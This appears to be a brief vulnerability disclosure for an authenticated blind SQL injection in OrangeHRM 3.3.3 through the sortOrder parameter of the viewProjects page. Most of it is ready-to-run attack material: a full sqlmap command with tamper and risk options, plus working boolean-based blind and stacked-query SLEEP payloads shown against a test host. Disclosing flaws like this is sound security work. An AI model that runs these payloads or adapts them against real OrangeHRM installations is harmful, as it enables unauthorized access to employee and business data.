Vulnerability: Blind SQLi 

```
URL: https://$HOST/symfony/web/index.php/admin/viewProjects?sortField=customerName&sortOrder=ASC
```

Version: ‎Orangehrm OS 3.3.3

Authenticated: Yes

User: Admin (possibly others)

Vulnerable Parameter: sortOrder


Command that was used to validate (Specify the correct DB used in your instance)
```
python3 sqlmap.py -r sqli --force-ssl --level 5 --risk 3 --random-agent --tamper between,charencode --dbms mysql --ignore-redirects --technique BS --flush-session --batch --current-user --string="Found"
```


sqlmap details
```
Parameter: #1* (URI)
	Type: boolean-based blind
	Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
	Payload: https://192.168.1.28/symfony/web/index.php/admin/viewProjects?sortField=customerName&sortOrder=ASC,(SELECT (CASE WHEN (5240=5240) THEN 1 ELSE 5240*(SELECT 5240 FROM INFORMATION_SCHEMA.PLUGINS) END))

	Type: stacked queries
	Title: MySQL >= 5.0.12 stacked queries (comment)
	Payload: https://192.168.1.28/symfony/web/index.php/admin/viewProjects?sortField=customerName&sortOrder=ASC;SELECT SLEEP(5)#
```




Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/OrangeHRM_3.3.3_SQLi_via_sortOrder.gif?raw=true)
